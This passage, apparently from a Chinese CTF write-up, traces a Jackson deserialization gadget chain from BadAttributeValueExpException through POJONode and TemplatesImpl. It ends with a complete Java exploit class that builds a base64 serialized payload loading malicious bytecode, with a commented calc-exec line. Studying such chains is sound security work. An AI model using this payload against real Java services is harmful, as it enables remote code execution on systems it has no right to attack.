(com.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">3821</span>, ObjectMapper (com.fasterxml.jackson.databind)</span><br></pre></td></tr></table></figure><p>几个关键方法：<br>defaultserializervalue:serializeValue</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public void serializeValue(JsonGenerator gen, Object value) throws IOException</span><br><span class="line">    &#123;</span><br><span class="line">        _generator = gen;</span><br><span class="line">        <span class="keyword">if</span> (value == null) &#123;</span><br><span class="line">            _serializeNull(gen);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        final Class&lt;?&gt; cls = value.getClass();</span><br><span class="line">        // true, since we do want to cache root-level typed serializers (ditto <span class="keyword">for</span> null <span class="built_in">property</span>)</span><br><span class="line">        final JsonSerializer&lt;Object&gt; ser = findTypedValueSerializer(cls, true, null);</span><br><span class="line">        PropertyName rootName = _config.getFullRootName();</span><br><span class="line">        <span class="keyword">if</span> (rootName == null) &#123; // <span class="keyword">not</span> explicitly specified</span><br><span class="line">            <span class="keyword">if</span> (_config.isEnabled(SerializationFeature.WRAP_ROOT_VALUE)) &#123;</span><br><span class="line">                _serialize(gen, value, ser, _config.findRootName(cls));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!rootName.isEmpty()) &#123;</span><br><span class="line">            _serialize(gen, value, ser, rootName);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        _serialize(gen, value, ser);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里调用一个 findTypedValueSerializer，根据传入的类，找到对应的 serializer，这里传入了一个 POJO 对象，所以会调用 beanserializer。</p><h2 id="回到题目"><span id="回到题目"> 回到题目</span></h2><p>打一个 tostring 链，<br>看 BadAttributeValueExpException</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">        Object valObj = gf.get(<span class="string">&quot;val&quot;</span>, null);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valObj == null) &#123;</span><br><span class="line">            val = null;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj instanceof String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == null</span><br><span class="line">                || valObj instanceof Long</span><br><span class="line">                || valObj instanceof Integer</span><br><span class="line">                || valObj instanceof Float</span><br><span class="line">                || valObj instanceof Double</span><br><span class="line">                || valObj instanceof Byte</span><br><span class="line">                || valObj instanceof Short</span><br><span class="line">                || valObj instanceof Boolean) &#123;</span><br><span class="line">            val = valObj.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; // the serialized <span class="built_in">object</span> <span class="keyword">is</span> <span class="keyword">from</span> a version without JDK-<span class="number">8019292</span> fix</span><br><span class="line">            val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>toString 方法，这里要调用 basejsonnode 的这个方法，给其赋值。<br>反射修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException exp = new BadAttributeValueExpException(null);</span><br><span class="line">        Field val = Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(true);</span><br><span class="line">        val.<span class="built_in">set</span>(exp,jsonNodes);</span><br></pre></td></tr></table></figure><p>跟进 toString</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> InternalNodeMapper.nodeToString(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">nodeToString</span><span class="params">(JsonNode n)</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> STD_WRITER.writeValueAsString(n);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123; <span class="comment">// should never occur</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">writeValueAsString</span><span class="params">(Object value)</span></span><br><span class="line">        <span class="keyword">throws</span> JsonProcessingException</span><br><span class="line">    &#123;        </span><br><span class="line">        <span class="comment">// alas, we have to pull the recycler directly here...</span></span><br><span class="line">        <span class="type">SegmentedStringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SegmentedStringWriter</span>(_generatorFactory._getBufferRecycler());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            _writeValueAndClose(createGenerator(sw), value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123; <span class="comment">// shouldn&#x27;t really happen, but is declared as possibility so:</span></span><br><span class="line">            <span class="keyword">throw</span> JsonMappingException.fromUnexpectedIOE(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sw.getAndClear();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进_writeValueAndClose</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">_writeValueAndClose</span><span class="params">(JsonGenerator gen, Object value)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (_config.isEnabled(SerializationFeature.CLOSE_CLOSEABLE) &amp;&amp; (value <span class="keyword">instanceof</span> Closeable)) &#123;</span><br><span class="line">            _writeCloseable(gen, value);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            _prefetch.serialize(gen, value, _serializerProvider());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            ClassUtil.closeOnFailAndThrowAsIOE(gen, e);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        gen.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>一路跟进 serialize，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serializeValue</span><span class="params">(JsonGenerator gen, Object value)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">   &#123;</span><br><span class="line">       _generator = gen;</span><br><span class="line">       <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">           _serializeNull(gen);</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">final</span> Class&lt;?&gt; cls = value.getClass();</span><br><span class="line">       <span class="comment">// true, since we do want to cache root-level typed serializers (ditto for null property)</span></span><br><span class="line">       <span class="keyword">final</span> JsonSerializer&lt;Object&gt; ser = findTypedValueSerializer(cls, <span class="literal">true</span>, <span class="literal">null</span>);</span><br><span class="line">       <span class="type">PropertyName</span> <span class="variable">rootName</span> <span class="operator">=</span> _config.getFullRootName();</span><br><span class="line">       <span class="keyword">if</span> (rootName == <span class="literal">null</span>) &#123; <span class="comment">// not explicitly specified</span></span><br><span class="line">           <span class="keyword">if</span> (_config.isEnabled(SerializationFeature.WRAP_ROOT_VALUE)) &#123;</span><br><span class="line">               _serialize(gen, value, ser, _config.findRootName(cls));</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!rootName.isEmpty()) &#123;</span><br><span class="line">           _serialize(gen, value, ser, rootName);</span><br><span class="line">           <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       _serialize(gen, value, ser);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>最后调用个_serialize，再一路跟进去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(JsonGenerator gen, SerializerProvider ctxt)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (_value == <span class="literal">null</span>) &#123;</span><br><span class="line">            ctxt.defaultSerializeNull(gen);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (_value <span class="keyword">instanceof</span> JsonSerializable) &#123;</span><br><span class="line">            ((JsonSerializable) _value).serialize(gen, ctxt);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 25-May-2018, tatu: [databind#1991] do not call via generator but through context;</span></span><br><span class="line">            <span class="comment">//    this to preserve contextual information</span></span><br><span class="line">            ctxt.defaultSerializeValue(_value, gen);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object bean, JsonGenerator gen, SerializerProvider provider)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (_objectIdWriter != <span class="literal">null</span>) &#123;</span><br><span class="line">            gen.setCurrentValue(bean); <span class="comment">// [databind#631]</span></span><br><span class="line">            _serializeWithObjectId(bean, gen, provider, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        gen.writeStartObject(bean);</span><br><span class="line">        <span class="keyword">if</span> (_propertyFilterId != <span class="literal">null</span>) &#123;</span><br><span class="line">            serializeFieldsFiltered(bean, gen, provider);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            serializeFields(bean, gen, provider);</span><br><span class="line">        &#125;</span><br><span class="line">        gen.writeEndObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里就是到了 beanserializer 了，再跟进</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">serializeFields</span><span class="params">(Object bean, JsonGenerator gen, SerializerProvider provider)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">final</span> BeanPropertyWriter[] props;</span><br><span class="line">        <span class="keyword">if</span> (_filteredProps != <span class="literal">null</span> &amp;&amp; provider.getActiveView() != <span class="literal">null</span>) &#123;</span><br><span class="line">            props = _filteredProps;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            props = _props;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">final</span> <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> props.length; i &lt; len; ++i) &#123;</span><br><span class="line">                <span class="type">BeanPropertyWriter</span> <span class="variable">prop</span> <span class="operator">=</span> props[i];</span><br><span class="line">                <span class="keyword">if</span> (prop != <span class="literal">null</span>) &#123; <span class="comment">// can have nulls in filtered list</span></span><br><span class="line">                    prop.serializeAsField(bean, gen, provider);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (_anyGetterWriter != <span class="literal">null</span>) &#123;</span><br><span class="line">                _anyGetterWriter.getAndSerialize(bean, gen, provider);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (i == props.length) ? <span class="string">&quot;[anySetter]&quot;</span> : props[i].getName();</span><br><span class="line">            wrapAndThrow(provider, e, bean, name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (StackOverflowError e) &#123;</span><br><span class="line">            <span class="comment">// 04-Sep-2009, tatu: Dealing with this is tricky, since we don&#x27;t have many</span></span><br><span class="line">            <span class="comment">//   stack frames to spare... just one or two; can&#x27;t make many calls.</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 10-Dec-2015, tatu: and due to above, avoid &quot;from&quot; method, call ctor directly:</span></span><br><span class="line">            <span class="comment">//JsonMappingException mapE = JsonMappingException.from(gen, &quot;Infinite recursion (StackOverflowError)&quot;, e);</span></span><br><span class="line">            <span class="type">DatabindException</span> <span class="variable">mapE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JsonMappingException</span>(gen, <span class="string">&quot;Infinite recursion (StackOverflowError)&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (i == props.length) ? <span class="string">&quot;[anySetter]&quot;</span> : props[i].getName();</span><br><span class="line">            mapE.prependPath(bean, name);</span><br><span class="line">            <span class="keyword">throw</span> mapE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serializeAsField</span><span class="params">(Object bean, JsonGenerator gen,</span></span><br><span class="line"><span class="params">            SerializerProvider prov)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// inlined &#x27;get()&#x27;</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> (_accessorMethod == <span class="literal">null</span>) ? _field.get(bean)</span><br><span class="line">                : _accessorMethod.invoke(bean, (Object[]) <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">               </span><br></pre></td></tr></table></figure><p>这有个反射触发 invoke 方法。<br>来到了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>之后就是打一个字节加载恶意类了。<br>payload 如下构造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(evilref.class.getName());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        CtClass superClass = classPool.get(AbstractTranslet.class.getName());</span></span><br><span class="line"><span class="comment">//        ctClass.setSuperclass(superClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;,ctClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ctClass.addConstructor(constructor);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = ctClass.toBytecode();</span><br><span class="line">        <span class="comment">//byte[][] codes = new byte[][]&#123;code&#125;;</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        ref(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        ref(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;shanghe&quot;</span>);</span><br><span class="line">        ref(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        serialize_func.serialize(exp);</span><br><span class="line">        WriteToFileExample(serialize_func.encryptToBase64(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">WriteToFileExample</span><span class="params">(String args)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;这是要写入文件的字符串内容&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;output.txt&quot;</span>));</span><br><span class="line">                writer.write(args);</span><br><span class="line">                writer.close();</span><br><span class="line">                System.out.println(<span class="string">&quot;字符串已成功写入文件。&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;写入文件时发生错误：&quot;</span> + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(Object obj,String field,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">reffield</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        reffield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        reffield.set(obj,value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看一下路由，他这个 param 